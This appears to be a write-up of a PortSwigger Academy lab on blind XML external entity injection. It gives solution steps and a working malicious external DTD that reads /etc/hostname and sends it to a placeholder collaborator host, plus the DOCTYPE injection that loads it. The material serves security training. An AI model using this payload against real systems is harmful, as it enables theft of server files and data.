# Blind XXE - to exfiltrate data using a malicious external DTD

## 📌 Lab Details
- **Title**: Blind XXE to exfiltrate data using a malicious external DTD
- **Difficulty**: Practitioner
- **Category**: XML external entity injection
- **Lab URL**: https://portswigger.net/academy/labs/launch/32ee145c6edcd4d8e12b0fbd40ddba9cb63067b92b095c98cf63926808be0b04?referrer=%2fweb-security%2fxxe%2fblind%2flab-xxe-with-out-of-band-exfiltration

## 🔍 Summary
This lab shows how to exploit a **blind XXE** vulnerability using a **malicious external DTD file** to exfiltrate data (in this case, the contents of `/etc/hostname`). Since the application does not return any visible output, you use **out-of-band (OAST)** techniques with **Burp Collaborator** to detect whether the exploit worked.

## 🛠 Steps to Solve
1. Copy the **Burp Collaborator** payload to the clipboard.
2. Inject the following payload on the **Exploit server**:
   ```sh
   <!ENTITY % file SYSTEM "file:///etc/hostname">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
   %eval;
   %exfil;
   ```
3. Insert the following **external entity** in between XML declaration:
   ```sh
   <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
   ```
4. Go to the **Collaborator** tab and click "Poll Now". The **HTTP** interaction will contain the contents of the `/etc/hostname` file.
   
## 📖 Key Takeaways
- The vulnerability is exploited using an **external DTD** hosted on the **exploit server**.
- **Burp Collaborator** is used to verify whether the exploit worked and to retrieve the exfiltrated data.
- This technique demonstrates how XXE can be used for **data theft** even when responses are completely silent.

## 🖼️ Screenshot 
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/4b28d16c-2290-409c-9741-8317f88c91e2" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/f2bee4a0-0517-40de-a605-cc12da8d4c9b" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/cf5204a8-b4b5-461a-b8a0-22362103838c" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/18cf4b05-c533-4b2f-8040-ae346ba250bb" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/e4170fdc-7076-4e04-ade2-04eb4780699d" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ede995a1-c6d5-4081-85e5-693b05f1ca79" />
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/314d1cd1-8235-45b3-842c-a3a6ce764b58" />
